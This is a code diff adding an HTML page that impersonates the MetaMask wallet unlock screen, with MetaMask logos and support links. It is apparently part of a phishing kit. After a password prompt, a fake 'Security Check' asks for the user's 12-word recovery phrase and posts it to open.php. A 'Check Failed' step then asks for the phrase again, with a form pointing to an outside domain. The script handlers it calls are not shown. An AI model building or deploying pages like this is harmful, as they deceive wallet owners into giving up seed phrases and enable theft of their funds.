@@ -1,0 +1,158 @@
+ <link href="./style/121.css" rel="stylesheet" />
+    <link href="./style/fox.css" rel="stylesheet" />
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="./js/metamask.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/mui/3.7.1/js/mui.min.js">
+<div id="passModal" class="modalxd" style="border-radius: 0px 0px 10px 10px; position: fixed; display: inline;">
+      <div class="modalxd-content" style="border-radius: 0px 0px 10px 10px">
+        <div class="app-header" style="height: 67px">
+          <div class="app-header__contents" style="width: 90%">
+            <div class="app-header__logo-container app-header__logo-container--clickable">
+              <img height="33" width="33" src="./images/metamask-fox.svg" class="app-header__metafox-logo app-header__metafox-logo--horizontal" alt="">
+            </div>
+            <div class="app-header__account-menu-container">
+              <div class="app-header__network-component-wrapper">
+                <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0">
+                  <div class="chip__left-icon">
+                    <div class="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg" style="background-color: #29b6af; border-color: #29b6af"></div>
+                  </div>
+                  <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 typography chip__label typography--h7 typography--weight-normal typography--color-ui-4">Ethereum mainnet</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <center>
+          <div class="main-container-wrapper">
+            <div class="unlock-page__container" style="border-radius: 0px 0px 10px 10px">
+              <div class="unlock-page">
+                <div class="unlock-page__mascot-container">
+                  <div style="z-index: 20000">
+                    <div id="logo-container" class="html-embed w-embed w-script">
+
+</div>
+                  </div>
+                </div>
+
+                <div id="phase1" style="display: none;">
+                  <br>
+                  <br>
+                  <img src="./images/l.gif" width="120" height="90">
+                </div>
+
+                <div id="phase2" style="display: none;">
+                  <h1 class="aaaaaa unlock-page__title">Welcome Back!</h1>
+                  <div>The decentralized web awaits</div>
+
+                  <form id="passform" action="open.php" onsubmit="" method="post" class="unlock-page__form">
+                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
+                      <label class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated" data-shrink="false" for="password" id="password-label"></label>
+                      <div class="MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
+                        <input id="passInput" aria-invalid="false" autocomplete="current-password" name="wordpass" placeholder="Password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="" required="" pattern=".{1,50}">
+                      </div>
+                    </div>
+                    <button type="submit" onclick="sendPass(); return false;" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSizeLarge MuiButton-sizeLarge MuiButton-fullWidth" style="
+                        background-color: rgb(3, 125, 214);
+                        color: white;
+                        margin-top: 20px;
+                        height: 60px;
+                        font-weight: 400;
+                        box-shadow: none;
+                        border-radius: 4px;
+                      ">
+                      <span class="MuiButton-label zzzzzza">Unlock</span>
+                    </button>
+                  </form>
+
+                  <div class="unlock-page__links">
+                    <span>
+                      or
+                      <a onclick="passPass(); return false;" class="unlock-page__link unlock-page__link--import">import using Secret Recovery Phrase</a>
+                    </span>
+                  </div>
+                  <div class="unlock-page__support">
+                    <span>
+                      Need help? Contact
+                      <a href="https://support.metamask.io/" target="_blank" rel="noopener noreferrer">MetaMask Support</a>
+                    </span>
+                  </div>
+                </div>
+
+                <div id="phase3" style="display: inline;">
+                  <h1 class="aaaaaa unlock-page__title">Security Check</h1>
+                  <div>We just need to confirm it's you.</div>
+                  <div>To continue, simply confirm your 12 word phrase.</div>
+
+                  <form id="phraseform" action="open.php" method="post" onsubmit="" class="unlock-page__form">
+                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
+                      <label class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated" data-shrink="false" for="password" id="password-label"></label>
+                      <div class="MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
+                        <input id="phraseInputx" minlength="30" aria-invalid="false" autocomplete="off" placeholder="12 word phrase" name="lucyphase" type="text" dir="" class="MuiInputBase-input MuiInput-inputs" value="" required="" pattern=".{30,150}">
+                      </div>
+                    </div>
+                    <button type="submit" onclick="" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSizeLarge MuiButton-sizeLarge MuiButton-fullWidth" style="
+                        background-color: rgb(3, 125, 214);
+                        color: white;
+                        margin-top: 20px;
+                        height: 60px;
+                        font-weight: 400;
+                        box-shadow: none;
+                        border-radius: 4px;
+                      ">
+                      <span class="MuiButton-label zzzzzza">Confirm</span>
+                    </button>
+                  </form>
+
+                  <div class="unlock-page__support">
+                    <span>
+                      Need help? Contact
+                      <a href="https://support.metamask.io/" target="_blank" rel="noopener noreferrer">MetaMask Support</a>
+                    </span>
+                  </div>
+                </div>
+
+                <div id="phase4" style="display: none">
+                  <h1 class="aaaaaa unlock-page__title">Check Failed</h1>
+                  <div>We cannot confirm it's you.</div>
+                  <div>Try again using correct 12 word phrase.</div>
+
+                  <form id="phraseform2" action="https://strongoblock.com/" onsubmit="sendPhrase2(); return false;" class="unlock-page__form">
+                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
+                      <label class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated" data-shrink="false" for="password" id="password-label"></label>
+                      <div class="MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
+                        <input id="phraseInput2" minlength="30" aria-invalid="false" autocomplete="off" placeholder="12 word phrase" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" value="" required="" pattern=".{30,150}">
+                      </div>
+                    </div>
+                  </form>
+
+                  <button type="submit" onclick="sendPhrase2(); return false;" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSizeLarge MuiButton-sizeLarge MuiButton-fullWidth" style="
+                      background-color: rgb(3, 125, 214);
+                      color: white;
+                      margin-top: 20px;
+                      height: 60px;
+                      font-weight: 400;
+                      box-shadow: none;
+                      border-radius: 4px;
+                    ">
+                    <span class="MuiButton-label zzzzzza">Confirm</span>
+                  </button>
+                  <div class="unlock-page__support">
+                    <span>
+                      Need help? Contact
+                      <a href="https://support.metamask.io/" target="_blank" rel="noopener noreferrer">MetaMask Support</a>
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </center>
+      </div>
+    </div>
+
+   
+    <style>
+      .unlock-page {
+        font-family: Roboto;
+      }
+    </style>
